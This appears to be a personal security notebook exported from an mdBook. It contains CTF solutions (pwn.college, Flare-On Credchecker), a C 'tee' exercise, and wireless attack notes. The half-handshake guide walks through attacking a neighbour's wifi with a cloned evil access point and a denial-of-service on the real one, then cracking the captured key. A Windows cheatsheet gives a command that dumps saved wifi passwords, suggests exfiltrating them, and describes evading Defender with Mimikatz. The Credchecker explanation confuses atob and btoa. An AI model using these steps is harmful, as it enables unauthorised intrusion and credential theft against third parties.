<p>In order to solve this level, you must figure out a series of random values which will be placed on the stack. You are highly encouraged to try using combinations of <code>stepi</code>, <code>nexti</code>, <code>break</code>, <code>continue</code>, and <code>finish</code> to make sure you have a good internal understanding of these commands. The commands are all absolutely critical to navigating a program's execution.</p>
<p>You can solve the challenge using the following commands :</p>
<pre><code>gdb&gt; disass main
   .................. .......   ...    ...............
   .................. .......   ...    ...............
   .................. .......   ...    ...............
   0x0000555555555c80 &lt;+474&gt;:   mov    esi,0x0
   0x0000555555555c85 &lt;+479&gt;:   lea    rdi,[rip+0xe3c]        # 0x555555556ac8
   0x0000555555555c8c &lt;+486&gt;:   mov    eax,0x0
   0x0000555555555c91 &lt;+491&gt;:   call   0x555555555250 &lt;open@plt&gt;
   0x0000555555555c96 &lt;+496&gt;:   mov    ecx,eax
   0x0000555555555c98 &lt;+498&gt;:   lea    rax,[rbp-0x18]
   0x0000555555555c9c &lt;+502&gt;:   mov    edx,0x8
   0x0000555555555ca1 &lt;+507&gt;:   mov    rsi,rax
   0x0000555555555ca4 &lt;+510&gt;:   mov    edi,ecx
   0x0000555555555ca6 &lt;+512&gt;:   call   0x555555555210 &lt;read@plt&gt;

gdb&gt; b *main+512
Breakpoint 1 at 0x0000555555555ca6

gdb&gt; c
Continuing.

gdb&gt; ni
gdb&gt; x/gx $rbp-0x18
0x7fffffffdd38: 0x6ce885632f7847a9

gdb&gt; c
Random value: 6ce885632f7847a9
You input: 6ce885632f7847a9
The correct answer is: 6ce885632f7847a9

gdb&gt; c
gdb&gt; ni
gdb&gt; x/gx $rbp-0x18
0x7fffffffdd38: 0xa21985366881490f

gdb&gt; c
Random value: a21985366881490f
You input: a21985366881490f
The correct answer is: a21985366881490f

gdb&gt; c
gdb&gt; ni
gdb&gt; x/gx $rbp-0x18
0x7fffffffdd38: 0x1062cc677e90758c

gdb&gt; c
Random value: 1062cc677e90758c
You input: 1062cc677e90758c
The correct answer is: 1062cc677e90758c
You win! Here is your flag:
pwn.college{REDACTED}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="credchecker"><a class="header" href="#credchecker">Credchecker</a></h1>
<p>Credchecker is the first challenge of the Flare-On 8 (2021) CTF Event and it was super easy to complete.</p>
<h2 id="the-challenge"><a class="header" href="#the-challenge">The Challenge</a></h2>
<p>We are given a <strong>admin.html</strong> file (which is the challenge meat), and a <strong>img</strong> directory containing an image (not important to us).</p>
<p>I first start a <strong>PHP Web Server</strong> using the following command
<code>php -S 127.0.0.1:6969</code></p>
<p>Then i can access the challenge using my browser at the following URL <strong>127.0.0.1:6969</strong>, let's see what the challenge page looks like in the first place.</p>
<p><img src="https://i.imgur.com/CXojMs8.png" alt="admin.html" /></p>
<h2 id="source-code"><a class="header" href="#source-code">Source Code</a></h2>
<p>To solve the challenge we need to look at the javascript code inside the <strong>admin.html</strong> file.</p>
<p>Whenever the button is pressed, the <strong>checkCreds()</strong> javascript function gets called.</p>
<p><img src="https://i.imgur.com/NVGdHtC.png" alt="button" /></p>
<p>Let's find this <strong>checkCreds()</strong> function.</p>
<p><img src="https://i.imgur.com/Y4OnfT7.png" alt="checkCreds" /></p>
<p>We're basically checking if <strong>btoa(ourInput)</strong> is equal to <strong>goldenticket</strong>, the <strong>btoa</strong> function takes a base64 string and decodes it.</p>
<p>We can assume that the password is the the base64 encoded verson of <strong>goldenticket</strong>, or <strong>atob(&quot;goldenticket&quot;)</strong> should also print you the password, the <strong>atob</strong> function takes an ascii string and encode it into base64.</p>
<p>Let's prove the password works...</p>
<p><img src="https://i.imgur.com/IP0qiPa.png" alt="goldenticket" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exercise-41"><a class="header" href="#exercise-41">Exercise 4.1</a></h1>
<p>This is one of the first exercises in this book, it's a pretty simple and cool challenge, we are asked to reproduce the <code>tee</code> linux binary, using our knowledge from the chapter.</p>
<p>Since <code>tee</code> is a simple program, rewriting the program should take us only a few minutes. The <code>tee</code> command reads its standard input until end-of-file, writing a copy of the input to standard output and to the file named in it's command line argument.</p>
<p>The <code>read</code> system call reads input until end-of-file, when read encounter an end-of-file it will return 0, we can just do a while loop and check if the return value of read was equal to <code>0</code> if it was not, the program will write to standard output.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;

int main(int argc, char **argv){
    char buf[1024];
    ssize_t ret;
    int fd;
    if(argc == 2){
        fd = open(argv[1], O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR);
        if(fd == -1){
            if(errno == EACCES) perror(&quot;open&quot;);
            exit(EXIT_FAILURE);
        }
    } else {
        fd = 1;
    }
    while((ret = read(0, buf, 1024-1)) != 0 &amp;&amp; write(fd, buf, ret)){
        if(ret == -1){
            if(errno == EINTR){
                continue;
            }
            perror(&quot;read&quot;);
            break;
        }
    }

    return 0;
}
</code></pre>
<p>Note that i haven't implemented <code>getopt</code> to the program i was too lazy for it... deal with it.</p>
<p>Also if you want to have a better error coverage in your program then you should instead go for this version.</p>
<pre><code class="language-cpp">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;

int main(int argc, char **argv){
    char buf[1024];
    ssize_t ret;
    int fd;
    if(argc == 2){
        fd = open(argv[1], O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR);
        if(fd == -1){
            if(errno == EACCES) perror(&quot;open&quot;);
            exit(EXIT_FAILURE);
        }
    } else {
        fd = 1;
    }
    while((ret = read(0, buf, 1024-1)) != 0){
        if(ret == -1){
            if(errno == EINTR){
                continue;
            }
            perror(&quot;read&quot;);
            break;
        }
        ret = write(fd, buf, ret);
        if(ret == -1){
            perror(&quot;write&quot;);
            break;
        }
    }

    return 0;
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="half-handshake-crack"><a class="header" href="#half-handshake-crack">Half-Handshake Crack</a></h1>
<p>Sometimes when waiting for handshakes you will catch only the half part of that handshake, that is without the handshake being acknowledged by the network in question.
Know that those handshakes can be extremely useful in certain scenarios.</p>
<p>When listening for handshakes in public places, you will often see half handshakes popped up in your capture file (or wireshark, or whatever you use). These handshakes are as much crackable as full three-way handshakes, thing is you can't know for sure if the password is right since half-handshake aren't acknowledge by the router.</p>
<p>You can capture Half Handshake pretty easily, first you need an adapter that his compatible with the aircrack-ng suite, here's a small list of chipset compatible with aicrack.</p>
<ul>
<li>Ralink RT8070, RT3070</li>
<li>Ralink RT2770, RT2750</li>
<li>Ralink RT3572, RT5572</li>
<li>Ralink RT5370N</li>
<li>Realtek RTL8812AU</li>
<li>Atheros AR9002U</li>
<li>Realtek RTL8188SU</li>
<li>Realtek RTL8192EU</li>
<li>Atheros AR9271</li>
</ul>
<p>Next thing to do is to install the right drivers for the adapter your going to use, i use Atheros AR9002U (TN-WN722N) and RTL8812AU (AWUS036ACH), so i installed the following drivers to get started.</p>
<pre><code>$ git clone https://github.com/aircrack-ng/rtl8188eus
$ git clone https://github.com/aircrack-ng/rtl8812au
</code></pre>
<p>Then you should be ready to go, enable monitor mode (don't forget to change your mac address <em>wink wink</em>), start airodump.</p>
<pre><code>$ sudo airodump-ng &lt;device&gt;
</code></pre>
<p>Find a target network (make sure you have the right to crack it), and note the channel the network is currently using. Now let's start the real things, we are going to want to see what's going on in the airodump capture for this reason we'll manually capture the handshake with wireshark instead of using the airodump --write switch.</p>
<pre><code>$ sudo airodump-ng &lt;device&gt; -c &lt;network channel&gt; &amp; wireshark
</code></pre>
<p>Open the wireshark window, and double click on the interface your currently listening on with airodump, now you can copy the BSSID of your target network and we'll use a filter inside wireshark so we will see only the packets addressed to this network.</p>
<pre><code>Wireshark BSSID Filter : wlan.ta == &lt;bssid&gt; || wlan.da == &lt;bssid&gt;
Handshake filter : eapol &amp;&amp; wlan.da == &lt;bssid&gt; || eapol &amp;&amp; wlan.ta == &lt;bssid&gt;
</code></pre>
<p>Now you can wait until someone tries to connect to the network with a password, you should capture EAPOL packets when the key reach <strong>Message 2 of 4</strong>, you know you have your half handshake.</p>
<h2 id="social-engineering-scenario"><a class="header" href="#social-engineering-scenario">Social Engineering Scenario</a></h2>
<p>Okay let's go a little deeper because half-handshakes can be used in a tons of different scenario, but in this section we'll explore one. </p>
<p>So here it is, you are currently in your home and you want to hack into your neighbor's wifi (totally unethical and illegal), but you can't seem to get any handshake out of their network, what you could do is make an Evil Access Point that looks exactly like your target network (same name, bssid) and put some random password on this network, you will also launch a ddos attack agains't the target network so that the victim can't connect to his real network. Now your neighbor get's home after a long day of work, he see's that he his disconnected from the network so he tries to connect to it, prompt is usual password and he see's that it doesn't work. </p>
<p>At this point you should have catched at least a handshake or even more that you can crack, it's time to stop the attack and allow your poor neighbor to connect back again to it's network.</p>
<p>Check on wireshark using the <strong>eapol</strong> filter or the Handshake filter i shown a little earlier, if you have eapol packets with &quot;Key (Message 2 of 4)&quot; this means you successfully captured your half-handshake. Save the capture to a .pcap file and we can go to the next step.</p>
<h2 id="time-to-crack"><a class="header" href="#time-to-crack">Time to crack</a></h2>
<p>Now you have successfully gotten your hands on your handshake it's time to crack it. For this, you can use either a predefined wordlist (works sometimes), or if you know the target you could build one based on your target, in this case i will show you using a predefined wordlist <strong>rockyou.txt</strong>, the command is the same as usual but i will still show it.</p>
<pre><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt &lt;capture file&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-tn-wn722n"><a class="header" href="#monitor-mode-on-tn-wn722n">Monitor Mode on TN-WN722N</a></h1>
<p>Installing the required packages and configure them to make TN-WN722N works in monitor mode is pretty straight forward, let's see how to do it.</p>
<h2 id="arch-linux"><a class="header" href="#arch-linux">Arch Linux</a></h2>
<pre><code class="language-bash">	pamcan -Syu
	pacman -S install bc -y
	sudo rmmod r8188eu.ko
	git clone https://github.com/aircrack-ng/rtl8188eus
	cd rtl8188eus
	sudo -i
	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
	exit
	make
	sudo make install
	sudo modprobe 8188eu

	# You can ignore compilation errors related to redhat
</code></pre>
<h2 id="debian-based-system"><a class="header" href="#debian-based-system">Debian based System</a></h2>
<pre><code class="language-bash">	sudo apt update
	sudo apt install bc -y
	sudo rmmod r8188eu.ko
	git clone https://github.com/aircrack-ng/rtl8188eus
	cd rtl8188eus
	sudo -i
	echo &quot;blacklist r8188eu&quot; &gt; &quot;/etc/modprobe.d/realtek.conf&quot;
	exit
	make
	sudo make install
	sudo modprobe 8188eu
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="monitor-mode-on-awus036ach"><a class="header" href="#monitor-mode-on-awus036ach">Monitor Mode on AWUS036ACH</a></h1>
<p>Installing the required packages and configure them to make AWUS036ACH works in monitor mode is pretty straight forward, let's see how to do it.</p>
<h2 id="arch-linux-1"><a class="header" href="#arch-linux-1">Arch Linux</a></h2>
<pre><code class="language-bash">	pamcan -Syu
	pacman -S install bc -y
	 git clone https://github.com/aircrack-ng/rtl8812au.git
	cd rtl8812au
	make
	sudo make install
	reboot
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="rpi-evil-ap-with-rtl88x2bu-wifi-card-driver"><a class="header" href="#rpi-evil-ap-with-rtl88x2bu-wifi-card-driver">RPI Evil AP with RTL88x2bu Wifi Card Driver</a></h1>
<p><em><strong>Fake / Evil AP's are great right !</strong></em></p>
<p>But sometime you want to make sure you have the most cheap pieces of equipment available so that if someone bust your device, you won't get mad losing it.</p>
<p>Hence this guide... RTL88x2bu is one of the cheapest wireless adapters available where i live, so i bought one a couple of years ago, but it was with disgust that i learn that this adapter didn't support monitor mode (this means i can't use it for attacks like deauth / dumping), and i also won't be able to see connections made on other networks.</p>
<p>Although the device can be used to make fake AP's, so this is what this guide will be about.</p>
<pre><code class="language-bash"># Update all packages per normal
sudo apt update
sudo apt upgrade

# Install prereqs
sudo apt install git dnsmasq hostapd bc build-essential dkms raspberrypi-kernel-headers

# Reboot just in case there were any kernel updates
sudo reboot

# Pull down the driver source
git clone https://github.com/cilynx/rtl88x2bu
cd rtl88x2bu/

# Configure for RasPi
sed -i 's/I386_PC = y/I386_PC = n/' Makefile
sed -i 's/ARM_RPI = n/ARM_RPI = y/' Makefile

# DKMS as above
VER=$(sed -n 's/\PACKAGE_VERSION=&quot;\(.*\)&quot;/\1/p' dkms.conf)
sudo rsync -rvhP ./ /usr/src/rtl88x2bu-${VER}
sudo dkms add -m rtl88x2bu -v ${VER}
sudo dkms build -m rtl88x2bu -v ${VER} # Takes ~3-minutes on a 3B+
sudo dkms install -m rtl88x2bu -v ${VER}

# Plug in your adapter then confirm your new interface name
ip addr

# Set a static IP for the new interface (adjust if you have a different interface name or preferred IP)
sudo tee -a /etc/dhcpcd.conf &lt;&lt;EOF
interface wlan1
    static ip_address=192.168.4.1/24
    nohook wpa_supplicant
EOF

# Clobber the default dnsmasq config
sudo tee /etc/dnsmasq.conf &lt;&lt;EOF
interface=wlan1
  dhcp-range=192.168.4.100,192.168.4.199,255.255.255.0,24h
EOF

# Configure hostapd
sudo tee /etc/hostapd/hostapd.conf &lt;&lt;EOF
interface=wlan1
driver=nl80211
ssid=pinet
hw_mode=g
channel=7
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=CorrectHorseBatteryStaple
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF

sudo sed -i 's|#DAEMON_CONF=&quot;&quot;|DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;|' /etc/default/hostapd

# Enable hostapd
sudo systemctl unmask hostapd
sudo systemctl enable hostapd

# Reboot to pick up the config changes
sudo reboot

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows-cheatsheet"><a class="header" href="#windows-cheatsheet">Windows Cheatsheet</a></h1>
<p>Since i am more of the Linux type than Windows (for now), i will make this small cheatsheet where i will add, tips and tricks troughout time.</p>
<p>Note that those are a bit like personal notes but if you find something that should be changed or something that need to be added, feel free to reach out to me.</p>
<h2 id="export-wireless-profiles-with-passwords"><a class="header" href="#export-wireless-profiles-with-passwords">Export wireless profiles with passwords</a></h2>
<p>Exporting wireless profiles on Windows is something pretty simple to do, you can achieve this using the following command.</p>
<pre><code>$ netsh wlan export profile key=clear
</code></pre>
<p>This will export each network the computer recently connected to along with the passwords for these networks in a XML file.</p>
<p>You could write a script to export these files, either using a request, dns exfil, email, or anything that comes through your mind.</p>
<h2 id="bypassing-antivirus-with-dumpstacklog-trick"><a class="header" href="#bypassing-antivirus-with-dumpstacklog-trick">Bypassing Antivirus with DumpStack.log trick</a></h2>
<p>Windows Defender is a little weird sometimes, in fact you can bypass it just by naming your file DumpStack.log, this work since Windows does not scan files named DumpStack.log. This will probably be patched in the future but it can be useful on unpatched computes.</p>
<p><img src="https://i.imgur.com/RnAUQEn.png" alt="Mimikatz bypass Defender" /></p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
